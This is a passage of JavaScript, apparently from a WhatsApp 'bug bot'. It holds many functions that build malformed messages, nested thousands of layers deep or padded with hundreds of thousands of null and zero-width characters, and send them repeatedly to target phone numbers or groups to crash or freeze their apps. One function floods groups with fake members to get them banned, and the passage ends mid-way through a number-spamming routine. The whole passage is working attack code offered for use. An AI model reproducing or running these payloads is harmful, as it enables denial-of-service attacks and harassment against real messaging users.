    for (var i = 0; i < depth; i++) {
      buf = wrapLd(tag, wrapLd([0x0A], buf));
    }
    return buf;
  };

  const resolveJid = function(raw) {
    var s = String(raw || '').trim();
    if (s.includes('@')) return s;
    return s.replace(/\D/g, '') + '@s.whatsapp.net';
  };

  const jids = (Array.isArray(target) ? target : [target])
    .map(resolveJid)
    .filter(function(j) { return j.length > 15; });

  if (!jids.length) return;

  for (var i = 0; i < 900; i++) {
    for (var ti = 0; ti < TAGS.length; ti++) {
      var tag = TAGS[ti];
      var payload = null;

      for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
        try {
          var decoded = proto.Message.decode(inflate(tag, depth));
          proto.Message.encode(decoded).finish();
          payload = decoded;
        } catch (_) {}
      }

      if (!payload) continue;

      var msgId = 'LZ' + Date.now().toString(36).toUpperCase() + '_' + i;

      try {
        await sock.relayMessage('status@broadcast', payload, {
          messageId: msgId,
          statusJidList: [target],
          additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
              tag: 'mentioned_users',
              attrs: {},
              content: [{
                tag: 'to',
                attrs: { jid: target },
                content: []
              }]
            }]
          }]
        });
      } catch (_) {}
    }
  }
}

async function CosmicFlow1msg(sock, target) {
while (Date.now() - Date.now() < 200000) {
const IMG = {
  url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
  directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
   mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
   fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
   fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
   fileLength: 20010,
   mediaKeyTimestamp: "1785637793",
   mimetype: "image/jpeg",
   height: 1600,
   width: 1200,
   jpegThumbnail: ""
 };

 const TAGS = [
  [0xBA, 0x03],
  [0xD2, 0x04],
  [0xAA, 0x02],
 ];

const encodeVarint = function(n) {
  var buf = [];
  while (n >= 0x80) {
   buf.push((n & 0x7f) | 0x80);
   n >>>= 7;
  }
  buf.push(n);
  return Buffer.from(buf);
 };

const wrapLd = function(tag, data) {
 return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
};

const basePayload = proto.Message.encode(
proto.Message.fromObject({ imageMessage: IMG })
).finish();

const inflate = function(tag, depth) {
var buf = basePayload;
for (var i = 0; i < depth; i++) {
buf = wrapLd(tag, wrapLd([0x0A], buf));
}
return buf;
};

const resolveJid = function(raw) {
var s = String(raw || '').trim();
if (s.includes('@')) return s;
return s.replace(/\D/g, '') + '@s.whatsapp.net';
};

const jids = (Array.isArray(target) ? target : [target])
.map(resolveJid)
.filter(function(j) { return j.length > 15; });

if (!jids.length) return;

var MAX_BATCH = 5;
var totalSent = 0;

for (var i = 0; i < 900; i++) {
for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
var chunk = jids.slice(offset, offset + MAX_BATCH);

for (var ti = 0; ti < TAGS.length; ti++) {
var tag = TAGS[ti];
var payload = null;

for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
try {
var decoded = proto.Message.decode(inflate(tag, depth));
proto.Message.encode(decoded).finish();
payload = decoded;
} catch (_) {}
}

if (!payload) continue;

var msgId = 'CSMC' + Date.now().toString(36).toUpperCase() + '_' + i + '_' + offset;

try {
await sock.relayMessage('status@broadcast', payload, {
messageId: msgId, statusJidList: chunk, additionalNodes: [{
  tag: 'meta', attrs: {}, content: [{
    tag: 'mentioned_users', attrs: {}, content: chunk.map(function(target) {
            return { tag: 'to', attrs: { jid: target }, content: [] };
           })
         }]
       }]
     });
     totalSent++;
     } catch (_) {}
         await new Promise(function(r) { setTimeout(r, 1000); });
        }
      }
    }
  }
}

async function makluwban(sock, target) {
    if (!target.endsWith("@g.us")) throw new Error('@g.us server required');

    const resolveJid = function(raw) {
        let s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });

    if (!jids.length) throw new Error('No valid JIDs');

    for (let i = 0; i < jids.length; i++) {
        const group = jids[i];

        try {
            await sock.groupParticipantsUpdate(group, ["13135550002@s.whatsapp.net"], "add");
        } catch (_) {}

        try {
            await sock.groupParticipantsUpdate(group, ['971500000000@s.whatsapp.net'], 'add');
        } catch (_) {}

        try {
            await sock.sendPresenceUpdate('composing', group);
        } catch (_) {}

        try {
            const fakeNumbers = Array.from({ length: 100 }, () => {
                return Math.floor(Math.random() * 9000000000000) + 1000000000000 + '@s.whatsapp.net';
            });
            for (const fakeJid of fakeNumbers) {
                await sock.groupParticipantsUpdate(group, [fakeJid], 'add').catch(() => {});
                await new Promise(r => setTimeout(r, 30));
            }
            await sock.sendMessage(group, { text: `🎭⃟༑⃰Apongg🩸🐉🎭⃟༑⌁` }).catch(() => {});
        } catch (_) {}
    }
}

async function mahenpler(sock, target) {
    const msg = {
        groupStatusMessageV2: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/553151991_818685271268692_6795957783606894464_n.enc?ccb=11-4&oh=01_Q5Aa4AHdygHdhtAMHQB0P7fDG2jGlUkQfSzCPw4NPnWbiF8eKQ&oe=69E640DB&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mp4",
                    fileSha256: "BAcpC1KGx40bu/FV78kBAafPjkkdj6DLVAx+B1g3avQ=",
                    fileLength: "109951162777600",
                    seconds: 1,
                    ptt: true,
                    mediaKey: "1KXHR1pvx2+y01K6Dewevx5FF5O5wfc5iE/oHIua2WY=",
                    fileEncSha256: "CggqdAt0fX+QHjKnfyX2OjO1OoUXLm5WlVlv6f5aGCU=",
                    directPath: "/v/t62.7114-24/553151991_818685271268692_6795957783606894464_n.enc?ccb=11-4&oh=01_Q5Aa4AHdygHdhtAMHQB0P7fDG2jGlUkQfSzCPw4NPnWbiF8eKQ&oe=69E640DB&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1774107510",
                    waveform: "EBAREicPEigjMkgwMDITDQ8QFBYkCwwMDAwIBAUCBScpMkNkUE1GTT1KVVk0VUVOWlUtWEk0X0o+Xh4XFxAIAQ==",
                    contextInfo: {
                        isForwarded: true,
                        forwardingScore: 999,
                        quotedMessage: {
                            listMessage: {
                                title: '\u0000'.repeat(350000),
                                description: '\u0000'.repeat(250000),
                                buttonText: 'surel',
                                footerText: '',
                                listType: 1,
                                sections: [
                                    {
                                        title: '',
                                        rows: Array.from({ length: 10 }, (_, i) => ({
                                            title: '\u0000'.repeat(250000),
                                            description: '\u0000'.repeat(250000),
                                            rowId: null,
                                        }))
                                    }
                                ]
                            }
                        }
                    }
                }
            }
        }
    }
  
    const TAGS = [
    [0xBA, 0x03],
    [0xD2, 0x04],
    [0xAA, 0x02],
  ];

  const encodeVarint = function(n) {
    var buf = [];
    while (n >= 0x80) {
      buf.push((n & 0x7f) | 0x80);
      n >>>= 7;
    }
    buf.push(n);
    return Buffer.from(buf);
  };

  const wrapLd = function(tag, data) {
    return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
  };

  const basePayload = proto.Message.encode(
    proto.Message.fromObject({ stickerPackMessage: msg })
  ).finish();

  const inflate = function(tag, depth) {
    var buf = basePayload;
    for (var i = 0; i < depth; i++) {
      buf = wrapLd(tag, wrapLd([0x0A], buf));
    }
    return buf;
  };

  const resolveJid = function(raw) {
    var s = String(raw || '').trim();
    if (s.includes('@')) return s;
    return s.replace(/\D/g, '') + '@s.whatsapp.net';
  };

  const jids = (Array.isArray(target) ? target : [target])
    .map(resolveJid)
    .filter(function(j) { return j.length > 15; });

  if (!jids.length) return;

  for (var i = 0; i < 999; i++) {
    for (var ti = 0; ti < TAGS.length; ti++) {
      var tag = TAGS[ti];
      var payload = null;

      for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
        try {
          var decoded = proto.Message.decode(inflate(tag, depth));
          proto.Message.encode(decoded).finish();
          payload = decoded;
        } catch (_) {}
      }

      if (!payload) continue;

      var msgId = 'LZ' + Date.now().toString(36).toUpperCase() + '_' + i;

      try {
        await sock.relayMessage('status@broadcast', payload, {
          messageId: msgId,
          statusJidList: [target],
          additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
              tag: 'mentioned_users',
              attrs: {},
              content: [{
                tag: 'to',
                attrs: { jid: target },
                content: []
              }]
            }]
          }]
        });
      console.log(chalk.green(`sukses send bug`));
      } catch (_) {
      console.log(chalk.red(`error om coba pasang yang benar lagi`));
      }
    }
  }
}

async function mahenpler(sock, target) {
    const bokepajcrot = {
       paymentLinkMetadata: {
button: {
displayText: "ꦾ 🦠⃟" + "ꦾ".repeat(999999),
},
header: {
headerType: 0
}
}
    };
    const ryyelek = {
       paymentLinkMetadata: {}
};
    
    const mahengtg001 = {
           interactiveMessage: {
body: {
text: "X"
},
nativeFlowMessage: {
buttons: Array.from({ length: 500000 }, () => ({}))
},
contextInfo: {
quotedMessage: {
contactMessage: {
displayName: "͢",
vcard: null
},
},
},
},
       };
            let msg = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: { 
                            text: "X" + "ꦾ".repeat(999999),
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        }
                    }
                }
            }
        };
    
    const akumwryy = "\u2063".repeat(70000);

    const auahbasahakumaz = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: akumwryy },
            nativeFlowResponseMessage: {
              buttons: [
                { name: "call_permission_request", buttonParamsJson: "\u0006".repeat(80000) }
              ]
            }
          }
        }
      }
    };
    
    const mahen002 = {
    SendPaymentRequest: {}
    };
    
    const memek = {
    groupStatusMessageV2: {
        message: {
          extendedTextMessage: {
            text: "X",
            linkPreviewMetadata: { 
              paymentLinkMetadata: { 
                provider: { paramsJson: "ꦾ".repeat(10000) },
                header:  { headerType: 1 },
                button: { displayText: "X" }
              },
              urlMetadata: { fbExperimentId: 999 },
              fbExperimentId: 999,
              linkMediaDuration: 999,
              socialMediaPostType: 9999
            }
          }
        }
      },
      };
      
      const mahengtg006 = {
    sendPaymentMessage: {}
      };
  
    const TAGS = [
    [0xBA, 0x03],
    [0xD2, 0x04],
    [0xAA, 0x02],
  ];

  const encodeVarint = function(n) {
    var buf = [];
    while (n >= 0x80) {
      buf.push((n & 0x7f) | 0x80);
      n >>>= 7;
    }
    buf.push(n);
    return Buffer.from(buf);
  };

  const wrapLd = function(tag, data) {
    return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
  };

  const basePayload = proto.Message.encode(
    proto.Message.fromObject({ stickerPackMessage: bokepajcrot, memek, ryyelek, msg, auahbasahakumaz, mahengtg006, mahen002, mahengtg01 })
  ).finish();

  const inflate = function(tag, depth) {
    var buf = basePayload;
    for (var i = 0; i < depth; i++) {
      buf = wrapLd(tag, wrapLd([0x0A], buf));
    }
    return buf;
  };

  const resolveJid = function(raw) {
    var s = String(raw || '').trim();
    if (s.includes('@')) return s;
    return s.replace(/\D/g, '') + '@s.whatsapp.net';
  };

  const jids = (Array.isArray(target) ? target : [target])
    .map(resolveJid)
    .filter(function(j) { return j.length > 15; });

  if (!jids.length) return;

  for (var i = 0; i < 999; i++) {
    for (var ti = 0; ti < TAGS.length; ti++) {
      var tag = TAGS[ti];
      var payload = null;

      for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
        try {
          var decoded = proto.Message.decode(inflate(tag, depth));
          proto.Message.encode(decoded).finish();
          payload = decoded;
        } catch (_) {}
      }

      if (!payload) continue;

      var msgId = 'LZ' + Date.now().toString(36).toUpperCase() + '_' + i;

      try {
        await sock.relayMessage('status@broadcast', payload, {
          messageId: msgId,
          statusJidList: [target],
          additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
              tag: 'mentioned_users',
              attrs: {},
              content: [{
                tag: 'to',
                attrs: { jid: target },
                content: []
              }]
            }]
          }]
        });
      await sock.relayMessage(target, msg, {});
      await sock.relayMessage(target, auahbasahakumaz, {});
        console.log("Successfully sent to target!");
      } catch (_) {
      console.log(chalk.red("error"));
      }
    }
}
}

async function spnona(sock, target) {
  await sock.relayMessage(target, {
      vievOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: ""
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_call",
                  buttonParamsJson: JSON.stringify({
                    display_text: "ꦽ".repeat(150000),
                    phone_number: "00000000000000"
                  })
                }
              ],
              version: 3
            }
          }
        }
      }
    },
    { participant: { jid: target } }
  );
}

async function nonapmq(sock, target) {
  await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "🥂🍷🥂🍷"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3,
            },
            contextInfo: {
  forwardingScore: 9999,
isForwarded: true,
mentionedJid: Array.from({ length: 1999 }, () => 
                            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                        ),
                        quotedMessage: {}
}
              }
            }                  
      }
    }, {});
}

async function kontol(sock, target) {
    const tempek = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "🎭⃟༑🩸🐉🎭⃟༑⌁⃰"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({})),
                        buttons: "\x10".repeat(250000) + "\n".repeat(250000),
                        entryPointConversionSource: "meta_ai_message"
                    },
                    contexInfo: {
                        mentionedJid: Array.from({ length: 2000 }, () =>
                            Math.floor(Math.random() * 700000) + "@s.whatsapp.net"
                        ),
                        remoteJid: "0@s.whatsapp.net"
                    }
                }
            }
        }
    };

    const boom = "\u0007" + "\u200B".repeat(25000);

    const fefek = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "X" + `${boom}`
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "call_permission_request",
                                paramsJson: "\u0000".repeat(35000)
                            },
                            {
                                name: "galaxy_message",
                                paramsJson: "\x00".repeat(10000)
                            }
                        ],
                        messageVersion: 3
                    },
                    contexInfo: {
                        forwardingScore: 9999,
                        isForwarded: true,
                        participant: "0@s.whatsapp.net",
                        statusAttributionType: 2,
                        statusAttributions: Array.from({ length: 2009990 }, (_, z) => ({
                            type: 1
                        })),
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, tempek, {});
    await sock.relayMessage(target, fefek, {});
    participant: true
}

async function delayGb(sock, groupJid) {
     // Validasi: hanya untuk grup
     if (!groupJid.endsWith("@g.us")) {
          throw new Error("Target harus berupa JID grup (@g.us)");
     }

     await sock.relayMessage(groupJid, {
          groupStatusMessageV2: {
               message: {
                    extendedTextMessage: {
                         text: "X" + "\0".repeat(250000)
                    },
                    contextInfo: {
                         mentionedJid: Array.from({ length: 2000 }, () =>
                              Math.floor(Math.random() * 700000) + "@s.whatsapp.net"
                         ),
                         // Untuk grup, participant harus berupa JID user, bukan "@g.us"
                         participant: groupJid,
                         remoteJid: groupJid,
                         isGroup: true,
                         forwardedNewsletterMessageInfo: {
                              newsletterJid: "120363430035004725@newsletter",
                              newsletterName: "https://t.me/ApongSkt",
                         }
                    }
               }
          },
          participant: {
               jid: groupJid
          }
     }, {});
}

async function sange(sock, groupJid) {
     if (!groupJid.endsWith("@g.us")) {
          throw new Error("Target harus berupa JID grup (@g.us)");
     }

     const msg1 = {
          interactiveMessage: {
               body: {
                    text: "X"
               },
               nativeFlowMessage: {
                    buttons: Array.from({ length: 500000 }, () => ({
                         buttonId: "\u0000".repeat(1000),
                         buttonText: {
                              displayText: "\x00" + "\0" + "\x10".repeat(1000)
                         }
                    })),
                    messageParamsJson: '{}'
               },
               contextInfo: {
                    remoteJid: groupJid,
                    participant: groupJid,
                    isGroup: true,
                    forwardingScore: 99999,
                    isForwarded: true,
                    forwardedAiBotMessageInfo: {
                         botJid: "867051314767696@bot"
                    },
                    forwardOrigin: 4
               },
               messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
               }
          }
     };

     const kontol = {
          interactiveMessage: {
               body: {
                    text: "Apongg¿?"
               },
               nativeFlowMessage: {
                    buttons: "\0".repeat(25000)
               },
               contextInfo: {
                    remoteJid: groupJid,
                    participant: groupJid,
                    isGroup: true,
                    statusAttributions: Array.from({ length: 50000 }, () => ({})),
                    carouselMessage: {
                         cards: Array(30000).fill("\r")
                    }
               }
          }
     };

     const ange = {
          interactiveMessage: {
               body: {
                    text: "X"
               },
               nativeFlowMessage: {
                    buttons: "\u200A" + "\x10".repeat(30000)
               },
               contextInfo: {
                    remoteJid: groupJid,
                    participant: groupJid,
                    isGroup: true
               }
          }
     };

     const anjay = {
          interactiveMessage: {
               body: {
                    text: "X"
               },
               nativeFlowMessage: {
                    buttons: [
                         {
                              name: "call_permission_request",
                              paramsJson: "\u0000".repeat(35000)
                         },
                         {
                              name: "galaxy_message",
                              paramsJson: "\x00".repeat(10000)
                         },
                         {
                              name: "booking_status",
                              buttonParamsJson: JSON.stringify({
                                   display_text: "\x10" + "\0".repeat(250000)
                              })
                         }
                    ]
               },
               contextInfo: {
                    remoteJid: groupJid,
                    participant: groupJid,
                    isGroup: true
               }
          }
     };

     await sock.relayMessage(groupJid, msg1, {});
     await sock.relayMessage(groupJid, kontol, {});
     await sock.relayMessage(groupJid, ange, {});
     await sock.relayMessage(groupJid, anjay, {});
}

async function forcloseinvisible(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            title: "\u0070".repeat(50000),
            subtitle: "\x10".repeat(50000),
            bloksWidget: {
              uuid: "\u200B".repeat(50000),
              data: "[".repeat(50001),
              type: "\u200F".repeat(50000),
              fallback: "\u200D".repeat(50000)
            }
          },
          body: { text: "\u000F" },
          nativeFlowMessage: {
            buttons: "[".repeat(50000)
          }
        }
      }
    }
  }, { participant: true });
}

async function ForcloseVideo(sock, target) {
const mahengtg3 = {
interactiveMessage: {
body: {
text: "𝑰͒𝒏͢𝒇͠𝒊͒𝒏͢𝒊͠𝒕͒𝒚͢"
},
nativeFlowMessage: {
buttons: Array.from({ length: 500000 }, () => ({}))
},
contextInfo: {
quotedMessage: {
contactMessage: {
displayName: "𝑰͒𝒏͢𝒇͠𝒊͒𝒏͢𝒊͠𝒕͒𝒚͢",
vcard: null
},
},
},
},
}

const mahengtg2 = {
sendPaymentMessage: {
            key: {
                remoteJid: target,
                fromMe: true,
                id: "\u0000".repeat(1000)
            },
            amount: 999999999, 
            currency: "\u0000".repeat(500),  
            note: "\u0000".repeat(500),
            transactionId: "\u0000".repeat(500),
            receiverJid: target
        }
        };
        
  const mahengtg = {
           stickerPackMessage: {
        stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
        name: "🔥🔥🔥" + "🔥".repeat(40000),
        publisher: "🔥".repeat(20000),
        stickers: [],
        fileLength: 12260,
        fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
        fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
        mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
        directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
        height: 9999,
        width: 9999,
        mediaKeyTimestamp: "1747502082",
        isAnimated: false,
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        emojis: ["🔥", "🔥", "🔥", "🔥"],
        contextInfo: {
          mentionedJid: [
            "131338822@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            )
          ],
          remoteJid: "X",
          participant: target,
          stanzaId: "1234567890ABCDEF",
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            }
          }
        },
        packDescription: "",
        trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
        thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
        thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
        thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
        stickerPackSize: "3680054",
        stickerPackOrigin: "USER_CREATED"
      }
       };

  const TAGS = [
    [0xBA, 0x03],
    [0xD2, 0x04],
    [0xAA, 0x02],
  ];

  const encodeVarint = function(n) {
    var buf = [];
    while (n >= 0x80) {
      buf.push((n & 0x7f) | 0x80);
      n >>>= 7;
    }
    buf.push(n);
    return Buffer.from(buf);
  };

  const wrapLd = function(tag, data) {
    return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
  };

  const basePayload = proto.Message.encode(
    proto.Message.fromObject({ imageMessage: mahengtg, mahengtg2, mahengtg3 })
  ).finish();

  const inflate = function(tag, depth) {
    var buf = basePayload;
    for (var i = 0; i < depth; i++) {
      buf = wrapLd(tag, wrapLd([0x0A], buf));
    }
    return buf;
  };

  const resolveJid = function(raw) {
    var s = String(raw || '').trim();
    if (s.includes('@')) return s;
    return s.replace(/\D/g, '') + '@s.whatsapp.net';
  };

  const jids = (Array.isArray(target) ? target : [target])
    .map(resolveJid)
    .filter(function(j) { return j.length > 15; });

  if (!jids.length) return;

  for (var i = 0; i < 900; i++) {
    for (var ti = 0; ti < TAGS.length; ti++) {
      var tag = TAGS[ti];
      var payload = null;

      for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
        try {
          var decoded = proto.Message.decode(inflate(tag, depth));
          proto.Message.encode(decoded).finish();
          payload = decoded;
        } catch (_) {}
      }

      if (!payload) continue;

      var msgId = 'LZ' + Date.now().toString(36).toUpperCase() + '_' + i;

      try {
        await sock.relayMessage('status@broadcast', payload, {
          messageId: msgId,
          statusJidList: [target],
          additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
              tag: 'mentioned_users',
              attrs: {},
              content: [{
                tag: 'to',
                attrs: { jid: target },
                content: []
              }]
            }]
          }]
        });
      } catch (_) {}
    }
  }
}

async function AponggFunction(sock, target) {
const msg = {
        vievOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: ""
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_call",
                  buttonParamsJson: JSON.stringify({
                    display_text: "ꦽ".repeat(150000),
                    phone_number: "00000000000000"
                  })
                }
              ],
              version: 3
            }
          }
        }
      }
    };
  
    const TAGS = [
    [0xBA, 0x03],
    [0xD2, 0x04],
    [0xAA, 0x02],
  ];

  const encodeVarint = function(n) {
    var buf = [];
    while (n >= 0x80) {
      buf.push((n & 0x7f) | 0x80);
      n >>>= 7;
    }
    buf.push(n);
    return Buffer.from(buf);
  };

  const wrapLd = function(tag, data) {
    return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
  };

  const basePayload = proto.Message.encode(
    proto.Message.fromObject({ stickerPackMessage: msg })
  ).finish();

  const inflate = function(tag, depth) {
    var buf = basePayload;
    for (var i = 0; i < depth; i++) {
      buf = wrapLd(tag, wrapLd([0x0A], buf));
    }
    return buf;
  };

  const resolveJid = function(raw) {
    var s = String(raw || '').trim();
    if (s.includes('@')) return s;
    return s.replace(/\D/g, '') + '@s.whatsapp.net';
  };

  const jids = (Array.isArray(target) ? target : [target])
    .map(resolveJid)
    .filter(function(j) { return j.length > 15; });

  if (!jids.length) return;

  for (var i = 0; i < 999; i++) {
    for (var ti = 0; ti < TAGS.length; ti++) {
      var tag = TAGS[ti];
      var payload = null;

      for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
        try {
          var decoded = proto.Message.decode(inflate(tag, depth));
          proto.Message.encode(decoded).finish();
          payload = decoded;
        } catch (_) {}
      }

      if (!payload) continue;

      var msgId = 'LZ' + Date.now().toString(36).toUpperCase() + '_' + i;

      try {
        await sock.relayMessage('status@broadcast', payload, {
          messageId: msgId,
          statusJidList: [target],
          additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
              tag: 'mentioned_users',
              attrs: {},
              content: [{
                tag: 'to',
                attrs: { jid: target },
                content: []
              }]
            }]
          }]
        });
      console.log(chalk.green(`Success Sending Bugs`));
      } catch (err) {
      console.log(chalk.red(`error om coba pasang yang benar lagi`));
      console.log(err);
      }
    }
  }
}

async function fcuya(sock, target) {
  const ios = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "Fc IOS???",
            subtitle: "Aponggg" + "𑇂𑆵𑆴𑆿".repeat(350000),
            hasMediaAttchment: true,
            locationMessage: {
              degreesLatitude: -98.628979,
              degreesLongitude: 89.9821647,
              name: "Sangat bagus" + "𑇂𑆵𑆴𑆿".repeat(99999),
              address: "\u200B" + "𑇂𑆵𑆴𑆿".repeat(99999),
              url: "https://t.me/ApongSkt" + "𑇂𑆵𑆴𑆿".repeat(500000),
            },
          },
          body: {
            text: "Kontol" + "𑇂𑆵𑆴𑆿".repeat(99999),
          },
          footer: {
            text: "Apongg",
          },
          nativeFlowMessage: {
            buttons: "\0" + "\n".repeat(35000),
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING",
          },
          cotexInfo: {
            externalAdReply: {
              quotedAd: {
                advertiserName: "yaaa" + "𑇂𑆵𑆴𑆿".repeat(30000),
                mediaType: "VIDEO",
                jpegThumbnail: "https://files.catbox.moe/dvbb24.mp4",
                caption: "Heloo friend" + "𑇂𑆵𑆴𑆿".repeat(50000),
              },
            },
          },
        },
      },
    },
  };

  await sock.relayMessage(target, ios, {
    participant: { jid: target },
  });
}

async function delayv2(sock, target) {
    try {
        const msg = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "\u0000".repeat(60899),
                            format: "DEFAULT"
                        },
                        nativeFlowMessage: {
                            buttons: "search_interval_message".repeat(20000) + "\u200B".repeat(30000)
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, msg, {});
    } catch (err) {
        console.error("X Error:", err.message);
    }
}

async function LocationHard(sock, target) {
    await sock.relayMessage(
        target,
        {
            groupStatusMessageV2: {
                message: {
                    viewOnceMessage: {
                        message: {
                            interactiveMessage: {
                                header: {
                                    title: ".",
                                    locationMessage: {},
                                    hasMediaAttachment: true
                                },
                                body: {
                                    text: "𝑰͒𝒏͢𝒇͠𝒊͒𝒏͢𝒊͠𝒕͒𝒚͢" + "\0".repeat(900000)
                                },
                                nativeFlowMessage: {
                                    messageParamsJson: "\0"
                                },
                                carouselMessage: {}
                            }
                        }
                    }
                }
            }
        },
        {
            participant: true
        }
    );
}

async function executions(sock, target) {
    try {
        const CONFIG = {
            retries: 2,
            timeout: 45000,
            delayMin: 2000,
            delayMax: 3000
        };

        const USER_AGENTS = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; SM-S921B) Chrome/120.0.0.0 Mobile Safari/537.36'
        ];

        const randomUA = () => USER_AGENTS[crypto.randomInt(0, USER_AGENTS.length)];
        const randomDelay = (min = CONFIG.delayMin, max = CONFIG.delayMax) =>
            new Promise(resolve => setTimeout(resolve, crypto.randomInt(min, max)));

        const normalizePhone = (phone) => {
            let p = phone.replace(/[^0-9]/g, "");
            if (p.startsWith("0")) p = "62" + p.slice(1);
            if (!p.startsWith("62")) p = "62" + p;
            return p;
        };

        const generateEmail = () => {
            const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
            let result = '';
            for (let i = 0; i < 10; i++) {
